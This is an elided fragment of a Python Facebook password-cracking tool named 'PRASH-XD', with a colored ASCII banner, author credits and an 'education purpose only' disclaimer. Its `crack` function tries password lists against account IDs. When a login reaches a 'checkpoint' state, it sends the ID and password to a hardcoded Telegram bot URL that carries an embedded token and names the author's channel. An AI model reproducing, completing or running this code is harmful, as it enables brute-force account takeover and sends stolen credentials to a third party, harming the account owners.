...
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\u001b[31mv4
\033[1;37m----------------------------------------------
 AUTHOR     : PRASHANT x ISHAN
 GITHUB     : PRASHANTBABE
 FACEBOOK   : Prashant koirala
 VERSION    :\u001b[32m 0.4.4\033[1;37m
 STATUS     : DISABLED
\033[1;37m----------------------------------------------
 THIS TOOL IS FOR EDUCATION PURPOSE ONLY
 HACKING IS ILLEGAL IN ALL COUNTRY
\033[1;37m----------------------------------------------""")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[PRASH-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.get("https://api.telegram.org/bot6411867531:AAFkbMbnpFBrZHDMqQqi4KIW_tLJ8lhEGBs/sendMessage?chat_id=@Prashantt999&text="+uname+"[ "+idf+' | '+pw+ " ]")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
